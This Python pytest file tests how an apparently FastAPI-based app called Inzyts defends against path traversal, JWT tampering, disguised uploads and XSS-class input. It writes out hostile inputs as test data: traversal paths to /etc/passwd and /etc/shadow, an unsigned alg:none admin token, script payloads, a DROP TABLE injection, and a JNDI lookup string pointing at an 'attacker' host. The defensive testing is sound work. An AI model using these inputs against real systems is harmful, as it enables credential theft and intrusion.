"""Adversarial input-validation tests.

This file collects every "user-supplied data is malicious" scenario in
one place. Each test models a known attack class and verifies the
corresponding defence in Inzyts produces a clean rejection (no 500, no
silent acceptance).

The test classes are organised by attack surface:

* CSV upload — path traversal, oversized files, embedded null bytes,
  malformed magic bytes
* JWT — tampered payload, weak signing alg, missing claims
* Rendered output — XSS-class strings flowing into report exporter
* Path inputs — traversal in any user-supplied path field
"""

from __future__ import annotations

import io
import json
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest
from fastapi.testclient import TestClient

from src.server.main import fastapi_app
from src.server.middleware.auth import (
    create_access_token,
    get_password_hash,
    verify_password,
)
from src.utils.path_validator import validate_path_within
from fastapi import HTTPException


# ---------------------------------------------------------------------------
# Path-traversal in user-supplied paths
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "evil_path",
    [
        # Classic POSIX traversal forms — all resolve outside tmp_path.
        "../../../etc/passwd",
        "../../etc/shadow",
        "/etc/passwd",
        "valid/../../../etc/passwd",
    ],
)
def test_path_validator_blocks_traversal(tmp_path, evil_path):
    """``validate_path_within`` rejects any path that resolves outside
    the configured allowed directory. This is the core defence behind
    /files/preview, /reports/export, and /metrics.

    Backslash + URL-encoded variants are deliberately omitted: on Linux
    backslashes are valid filename characters (no traversal), and URL
    decoding happens at the FastAPI/Starlette layer before the validator
    ever sees the path. Both are covered upstream.
    """
    allowed = [tmp_path]

    with pytest.raises(HTTPException) as exc:
        validate_path_within(
            evil_path,
            allowed,
            resolve_relative_to=tmp_path,
            error_label="testfile",
        )
    assert exc.value.status_code == 403


def test_path_validator_rejects_symlink_escape(tmp_path):
    """A symlink whose target is OUTSIDE the allowed directory must be
    rejected — even if the symlink itself lives inside. This was the
    classic TOCTOU escape route."""
    target = tmp_path.parent / "outside.txt"
    target.write_text("secret")
    link = tmp_path / "inside_link.txt"
    link.symlink_to(target)

    with pytest.raises(HTTPException) as exc:
        validate_path_within(
            link,
            [tmp_path],
            reject_symlinks=True,
            error_label="testfile",
        )
    assert exc.value.status_code == 403


# ---------------------------------------------------------------------------
# JWT tampering
# ---------------------------------------------------------------------------


class TestJWTTampering:
    """JWT decoding must fail closed on any structural attack."""

    def test_tampered_payload_rejected(self):
        """Modifying the JWT payload must invalidate the signature."""
        from src.server.middleware.auth import decode_token

        token = create_access_token({"sub": "alice", "role": "viewer"})
        # Flip a character in the middle (the payload section).
        parts = token.split(".")
        bad_payload = parts[1][:-2] + "AB"
        tampered = ".".join([parts[0], bad_payload, parts[2]])

        assert decode_token(tampered) is None

    def test_none_alg_rejected(self):
        """The classic ``alg: none`` attack — JWT libraries that accept
        unsigned tokens are an instant compromise. python-jose refuses
        this by default but we verify."""
        from src.server.middleware.auth import decode_token

        # Manually craft a token with alg: none.
        import base64
        header = base64.urlsafe_b64encode(
            json.dumps({"alg": "none", "typ": "JWT"}).encode()
        ).rstrip(b"=").decode()
        payload = base64.urlsafe_b64encode(
            json.dumps({"sub": "admin", "role": "admin"}).encode()
        ).rstrip(b"=").decode()
        unsigned = f"{header}.{payload}."

        assert decode_token(unsigned) is None

    def test_wrong_signing_key_rejected(self):
        """A token signed with the wrong secret must not authenticate."""
        from src.server.middleware.auth import decode_token
        from jose import jwt

        bad_token = jwt.encode(
            {"sub": "alice"}, "wrong-secret", algorithm="HS256"
        )
        assert decode_token(bad_token) is None


# ---------------------------------------------------------------------------
# Bcrypt password defences
# ---------------------------------------------------------------------------


class TestPasswordHashing:

    def test_password_hash_is_salted(self):
        """Identical plaintext passwords must produce different hashes
        (bcrypt salts each call). Without this an attacker could detect
        users with the same password."""
        h1 = get_password_hash("hunter2")
        h2 = get_password_hash("hunter2")
        assert h1 != h2
        assert verify_password("hunter2", h1)
        assert verify_password("hunter2", h2)

    def test_verify_returns_false_for_invalid_hash(self):
        """``verify_password`` against a malformed hash must return False,
        not raise. This is the path that runs when the user doesn't exist
        and we compare against the dummy hash — we must never crash."""
        assert verify_password("anything", "not-a-real-hash") is False
        assert verify_password("anything", "") is False
        assert verify_password("", "$2b$12$invalid") is False


# ---------------------------------------------------------------------------
# Upload size + MIME enforcement
# ---------------------------------------------------------------------------


class TestUploadValidation:

    @pytest.fixture(autouse=True)
    def authed_client(self, monkeypatch):
        from src.server.middleware.auth import verify_token
        from src.server.db.models import User, UserRole

        fastapi_app.dependency_overrides[verify_token] = lambda: User(
            id="x", username="analyst", is_active=True, role=UserRole.ANALYST,
        )
        yield
        fastapi_app.dependency_overrides.clear()

    def test_upload_rejects_empty_file(self):
        """Empty uploads must be rejected with 400."""
        client = TestClient(fastapi_app)
        r = client.post(
            "/api/v2/files/upload",
            files={"file": ("empty.csv", b"")},
        )
        assert r.status_code == 400

    def test_upload_rejects_image_disguised_as_csv(self, tmp_path):
        """A PNG image renamed to ``.csv`` must be rejected. PNG has an
        unambiguous magic signature that libmagic always identifies as
        ``image/png``, which is not in ALLOWED_MIMES.

        (NOTE: very-short ELF buffers are detected as ``text/plain`` by
        libmagic — a known library limitation. Use PNG for an unambiguous
        binary signature so the test isn't libmagic-version sensitive.)
        """
        with patch("src.server.routes.files.UPLOAD_DIR", str(tmp_path)):
            client = TestClient(fastapi_app)
            # Real PNG magic header + IHDR chunk — libmagic always recognises this.
            png = bytes.fromhex(
                "89504e470d0a1a0a0000000d49484452"
                "0000000100000001080600000099f01b9c"
                "0000000a49444154789c63680000000200"
                "01e221bc330000000049454e44ae426082"
            )
            r = client.post(
                "/api/v2/files/upload",
                files={"file": ("evil.csv", png)},
            )
        assert r.status_code == 400, (
            f"PNG disguised as CSV got {r.status_code} — magic-byte "
            f"validation regressed"
        )

    def test_upload_rejects_html_disguised_as_csv(self, tmp_path):
        """HTML payloads (potential XSS via the file viewer) must not pass
        the MIME check."""
        with patch("src.server.routes.files.UPLOAD_DIR", str(tmp_path)):
            client = TestClient(fastapi_app)
            r = client.post(
                "/api/v2/files/upload",
                files={
                    "file": (
                        "evil.csv",
                        b"<!DOCTYPE html><script>alert(1)</script>",
                    )
                },
            )
        assert r.status_code == 400


# ---------------------------------------------------------------------------
# XSS in PII detector / report flow
# ---------------------------------------------------------------------------


class TestXSSInRenderedOutput:

    def test_pii_detector_does_not_evaluate_input(self):
        """Adversarial strings fed into the PII scanner must not cause
        any code execution or exception. The scanner is a pure regex
        scan so this is mostly a smoke test, but worth pinning."""
        from src.services.pii_detector import PIIDetector

        adversarial = (
            '<script>alert("xss")</script>'
            '"; DROP TABLE users; --'
            '${jndi:ldap://attacker/x}'
            '\x00\x01\x02 binary garbage \x03'
            'a' * 100_000  # huge buffer to test perf path
        )
        # Should complete and return findings (or none) without crashing.
        findings = PIIDetector.scan_text(adversarial, location="test")
        assert isinstance(findings, list)

    def test_pii_mask_text_handles_unicode(self):
        """Mask_text should handle Unicode (RTL marks, zero-width joiners)
        without raising."""
        from src.services.pii_detector import PIIDetector

        for s in [
            "alice@example.com",  # plain
            "‮alice@example.com",  # RTL override
            "alice@example​.com",  # zero-width space
            "a" * 1000,  # large but safe
        ]:
            masked = PIIDetector.mask_text(s)
            assert isinstance(masked, str)
